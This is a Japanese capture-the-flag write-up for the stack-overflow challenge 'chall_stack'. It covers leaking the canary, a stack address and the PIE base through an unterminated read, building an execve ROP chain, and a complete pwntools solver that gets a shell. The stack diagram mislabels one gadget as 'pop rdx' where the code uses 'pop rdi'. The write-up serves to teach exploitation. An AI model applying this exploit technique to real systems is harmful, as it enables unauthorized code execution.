*** chall_stack
    問題
#+begin_src c
#include <stdio.h>
#include <unistd.h>

int main(void){
	char msg[0x10] = {};

	setbuf(stdout, NULL);

	puts("You can put message 4 times!");
	for(int i=0; i<4; i++){
		printf("Input (%d/4) >> ", i+1);
		read(STDIN_FILENO, msg, 0x70);
		printf("Output : %s\n", msg);
	}
	puts("Bye!");

	return 0;
}


#+end_src
    
    #+begin_example
shiba@shiba-Endeavor-MR4900:~/ctfbook/pwnable/99_challs/stack$ checksec --file chall_stack[!] Did not find any GOT entries
[*] '/home/shiba/ctfbook/pwnable/99_challs/stack/chall_stack'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    #+end_example

    ソースコードから、 ~read~ において、 ~0x60~ バイトだけスタックバッファオーバフローが発生することがわかる。
    しかし、checksecの結果からわかる通り、SSPが有効である。
    このため、リターンアドレスを書き換えるためには、canaryの特定が必要となる。
    また、PIEが有効であることから、ROPを組むために実行ファイルのベースアドレスの特定も必要となる。
    また、 ~"/bin/sh"~ を書き込むのに便利な ~bss~ 領域のアドレスもランダム化されてしまうため、
    シェル起動に必要となる ~"/bin/sh"~ を書き込むための領域として、スタックか ~bss~ 領域のアドレスリークが必要となる。

    ここで、もう一度ソースコードを見てみると、
    ~read~ は、入力文字列の最後に終端文字( ~\x00~ )が追加されないこと、
    および、 ~read~ 直後に入力した ~msg~ の内容が出力されることから、 ~msg~ を利用したcanaryの特定が可能なことがわかる。

   また、実行ファイルやスタックのアドレスに関しては、スタックに残っている情報から漏洩できないかGDBで動作させながら調査する。

**** canaryの特定
     それでは、早速 ~hoge~ を入力した状態のスタックを確認する。
     #+begin_example
gef➤  dps
0x00007fffffffdb20│+0x0000: 0x00007fffffffdc88  →  0x00007fffffffe039  →  "/home/shiba/ctfbook/pwnable/99_challs/stack/chall_[...]"        ← $rsp
0x00007fffffffdb28│+0x0008: 0x0000000000000000
0x00007fffffffdb30│+0x0010: 0x0000000a65676f68 ("hoge\n"?)       ← $rsi
0x00007fffffffdb38│+0x0018: 0x0000000000000000
0x00007fffffffdb40│+0x0020: 0x0000000000000000
0x00007fffffffdb48│+0x0028: 0xdf8c8d9831278700
0x00007fffffffdb50│+0x0030: 0x00007ffff7f3b180  →  <__libc_csu_init+0> endbr64   ← $rbp
0x00007fffffffdb58│+0x0038: 0x00007ffff7f3a9b0  →  <__libc_start_main+1168> mov edi, eax
0x00007fffffffdb60│+0x0040: 0x0000000000000000
0x00007fffffffdb68│+0x0048: 0x0000000100000000
gef➤
0x00007fffffffdb70│+0x0050: 0x00007fffffffdc88  →  0x00007fffffffe039  →  "/home/shiba/ctfbook/pwnable/99_challs/stack/chall_[...]"
0x00007fffffffdb78│+0x0058: 0x00007ffff7f3a0c9  →  <main+0> endbr64
...
     #+end_example

     すると、 ~hoge~ が存在する ~rsp+0x10~ のアドレスが、 ~msg~ のアドレスであると推測できる。
     ここで、 canaryは ~rsp+0x28~ に存在していることも確認できる。
     また、 ~rsp+0x50~ のアドレスにおいて、スタックのアドレスが、
     ~rsp+0x58~ のアドレスにおいて、 ~main~ のアドレスが落ちていることも確認できる。
     これらの値を特定し、必要な情報を集めることで、シェルを起動できそうである。

     そこで、まず最初にcanaryの特定を行う。
     canaryの最初の ~\x00~ までを書き潰し、残りの7バイトを漏洩させるため、 ~0x19~ バイトの入力を行ってみる。

     #+begin_example
You can put message 4 times!
Input (1/4) >> Output : aaaaaaaaaaaaaaaaaaaaaaaaa\x1bM4R7\x9fĀ\xc1\xbeA\xec
Input (2/4) >> 
     #+end_example
     すると、上記のようにcanaryと思われる内容が漏洩していることを確認できる。

     そこで、GDBを利用して、漏洩した内容と実際のcanaryを比較してみる。

     漏洩した内容
     #+begin_example
[*] canary = 0xb1e31b1661ef7500
     #+end_example

     スタックの状態
     #+begin_example
gef➤  dps
0x00007ffd72921a00│+0x0000: 0x00007ffd72921b68  →  0x00007ffd72922074  →  "./chall_stack"	 ← $rsp
0x00007ffd72921a08│+0x0008: 0x0000000100000000
0x00007ffd72921a10│+0x0010: 0x6161616161616161	 ← $rax, $rsi
0x00007ffd72921a18│+0x0018: 0x6161616161616161
0x00007ffd72921a20│+0x0020: 0x6161616161616161
0x00007ffd72921a28│+0x0028: 0xb1e31b1661ef7521
0x00007ffd72921a30│+0x0030: 0x00007f1de82a1180  →  <__libc_csu_init+0> endbr64  ← $rbp
     #+end_example

     上記の結果か、無事にcanaryを特定することができたことがわかる。

     それでは、次にスタックのアドレスの特定を行う。

**** スタックのアドレスの特定
     先述したように、スタックの ~rsp+0x50~ のアドレスに、スタックののアドレスが落ちている。
    このため、canaryを特定したときと同様にこのアドレスを漏洩させる。
     
    漏洩した内容
    #+begin_example
[*] stack_leak = 0x7ffde10d8da8
    #+end_example

    スタックの状態
    #+begin_example
...    
0x00007ffde10d8c80│+0x0040: 0x6262626262626262
0x00007ffde10d8c88│+0x0048: 0x2162626262626262    
0x00007ffde10d8c90│+0x0050: 0x00007ffde10d8da8  →  0x00007ffde10da074  →  "./chall_stack"
...
    #+end_example

    こちらも、同様にアドレスの特定に成功していることが確認できる。

    リークしたスタックのアドレスは、スタック上に格納する ~"/bin/sh"~ の文字列のアドレスを特定するために使用する。
    そこで、予めリークしたアドレスと ~msg~ が格納されるアドレスを求めておく。
    #+begin_src python
      stack_diff = 0x00007ffde10d8da8-0x00007ffde10d8c50
      msg_addr = stack_leak - stack_diff
    #+end_src
    
    それでは、次にROPを組むために実行ファイルのベースアドレスの特定を行う。

**** 実行ファイルのベースアドレスの特定
    先述したように、スタックの ~rsp+0x58~ のアドレスに、 ~main~ の先頭のアドレスが落ちている。
    これも同様にアドレスを漏洩させる。

    漏洩した内容
    #+begin_example
[*] main_leak = 0x7eff7dbe90c9
    #+end_example

    スタックの状態
    #+begin_example
...    
0x00007ffd5b9c8198│+0x0048: 0x6262626262626262
0x00007ffd5b9c81a0│+0x0050: 0x2162626262626262
0x00007ffd5b9c81a8│+0x0058: 0x00007eff7dbe90c9  →  <main+0> endbr64
...
    #+end_example

    こちらも、同様にアドレスの特定に成功していることが確認できる。

    リークした ~main~ のアドレスから、実行ファイルのベースアドレスを特定する。
    そこで、実行ファイルの ~main~ のアドレスとリークした ~main~ のアドレスの差分を計算する。
    #+begin_src python
chall_base = main_leak - main_addr
    #+end_src

    最後に、 ~"/bin/sh"~ を用意し、シェルを起動するROPを作成する。 

**** ROPチェーンの作成
     最後の入力では、 ~msg~ の最初に ~/bin/sh\x00~ を挿入し、canaryが存在した場所には、先程特定したcanaryの値入るように調整する。
     そして、リターンアドレスがあった ~rsp+0x38~ からシェルを起動するためのROPチェーンを配置する。

     ここで組むROPは、ただシェルを起動できればよいため、 ~execve("/bin/sh", 0, 0)~ となるようにそれぞれのレジスタに値を挿入していく。
     
     ROPガジェットは、 ~chall_base~ を加算しないと正しいアドレスにならないため、注意する。

     スタックのイメージ
     #+begin_example
     |---------------|
     | "/bin/sh\x00" | <-msg_addr
     | "aaaaaaaa"    |
     | "aaaaaaaa"    |
     | canary        |
     | "bbbbbbbb"    |
     | pop rdx       |
     | 0x0           |
     | pop rsi       |
     | 0x0           |
     | pop rdx       |
     | msg_addr      |
     | pop rax       |
     | 59            |
     | syscall       |
     |---------------|
     #+end_example

     
**** Solver
     #+begin_src python
from pwn import *

filename = './chall_stack'
chall = ELF(filename)

# conn = remote('localhost', 9001)
conn = process(filename)
# conn = gdb.debug(filename, '''
# aslr on
# b main
# p 26''')

# ROP gadget
main_addr = chall.functions['main'].address
## 0x0000000000009643: syscall;
syscall = 0x0000000000009643
## 0x0000000000059a27: pop rax; ret;
pop_rax = 0x0000000000059a27
## 0x0000000000009c3a: pop rdi; ret;
pop_rdi = 0x0000000000009c3a
## 0x00000000000177ce: pop rsi; ret;
pop_rsi = 0x00000000000177ce
## 0x0000000000009b3f: pop rdx; ret;
pop_rdx = 0x0000000000009b3f


# Fist input
buf1 = b'a'*(0x28-0x10)
buf1 += b'!'
conn.sendafter(b'Input (1/4) >> ', buf1)
conn.recvuntil(b'aaaa!')
canary = b'\x00' + conn.recv(0x7)
info("canary = 0x{:08x}".format(u64(canary)))

# Second input
buf2 = b'b'*(0x4f-0x10)
buf2 += b'!'
conn.sendafter(b'Input (2/4) >> ', buf2)
conn.recvuntil(b'bbbb!')
stack_leak = u64(conn.recv(0x6)+b'\x00\x00')
stack_diff = 0x00007ffde10d8da8-0x00007ffde10d8c50
msg_addr = stack_leak - stack_diff
info("stack_leak = 0x{:08x}".format(stack_leak))
info("msg_addr = 0x{:08x}".format(msg_addr))

# Third input
buf3 = b'c'*(0x57-0x10)
buf3 += b'!'
conn.sendafter(b'Input (3/4) >> ', buf3)
conn.recvuntil(b'cccc!')
main_leak = u64(conn.recv(0x6)+b'\x00\x00')
chall_base = main_leak - main_addr
info("main_leak = 0x{:08x}".format(main_leak))
info("chall_base = 0x{:08x}".format(chall_base))

# Forth input
buf4 = b"/bin/sh\x00"
buf4 += b'a'*(0x28-0x10-len(buf4))
buf4 += canary
buf4 += b'b'*0x8
buf4 += p64(pop_rdx + chall_base)
buf4 += p64(0x0)
buf4 += p64(pop_rsi + chall_base)
buf4 += p64(0x0)
buf4 += p64(pop_rdi + chall_base)
buf4 += p64(msg_addr)
buf4 += p64(pop_rax + chall_base)
buf4 += p64(59)
buf4 += p64(syscall + chall_base)
conn.sendafter(b'Input (4/4) >> ', buf4)

conn.interactive()

     #+end_src
     
     #+begin_example
shiba@shiba-Endeavor-MR4900:~/ctfbook/pwnable/99_challs/stack$ python solve.py
[!] Did not find any GOT entries
[*] '/home/shiba/ctfbook/pwnable/99_challs/stack/chall_stack'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './chall_stack': pid 27533
[*] canary = 0x522e8a24383c9c00
[*] stack_leak = 0x7fff290b1098
[*] msg_addr = 0x7fff290b0f40
[*] main_leak = 0x7f3b6f01f0c9
[*] chall_base = 0x7f3b6f015000
[*] Switching to interactive mode
Output : /bin/sh
Bye!
$ id
uid=1000(shiba) gid=1000(shiba) groups=1000(shiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(kvm),120(lpadmin),132(lxd),133(sambashare),998(docker)
     #+end_example
    
    

    
    
    
